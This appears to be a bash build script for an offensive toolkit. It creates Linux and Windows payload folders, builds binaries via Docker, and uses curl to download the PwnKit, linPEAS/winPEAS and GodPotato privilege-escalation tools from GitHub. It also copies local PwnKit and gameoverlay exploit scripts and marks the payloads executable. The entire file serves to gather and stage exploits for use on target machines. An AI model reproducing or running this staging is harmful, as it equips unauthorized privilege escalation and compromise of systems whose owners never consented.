#!/bin/bash
mkdir -p payloads/lin/32 payloads/lin/64 payloads/lin/shell payloads/win/32 payloads/win/64 payloads/win/shell payloads/win/msil/2 payloads/win/msil/3 payloads/win/msil/4
pushd src
DOCKER_BUILDKIT=1 docker build --build-arg docker_image=i386/alpine:latest --output type=local,dest=../payloads/lin/32 .
DOCKER_BUILDKIT=1 docker build --build-arg docker_image=alpine:latest      --output type=local,dest=../payloads/lin/64 .
popd

curl -L https://github.com/ly4k/PwnKit/raw/main/PwnKit > payloads/lin/64/pwnkit
curl -L https://github.com/ly4k/PwnKit/raw/main/PwnKit32 > payloads/lin/32/pwnkit
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64 > payloads/lin/64/linpeas
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_386 > payloads/lin/32/linpeas
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > payloads/lin/shell/linpeas.sh
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe > payloads/win/64/winpeas.exe
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx86.exe > payloads/win/32/winpeas.exe
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat > payloads/win/shell/winpeas.bat
curl -L https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe > payloads/win/msil/2/godpotato.exe
curl -L https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe > payloads/win/msil/3/godpotato.exe
curl -L https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe > payloads/win/msil/4/godpotato.exe
cp src/PwnKit.sh payloads/lin/shell/pwnkit.sh
cp src/gameoverlay.sh payloads/lin/shell/gameoverlay.sh

chmod -R +x payloads/lin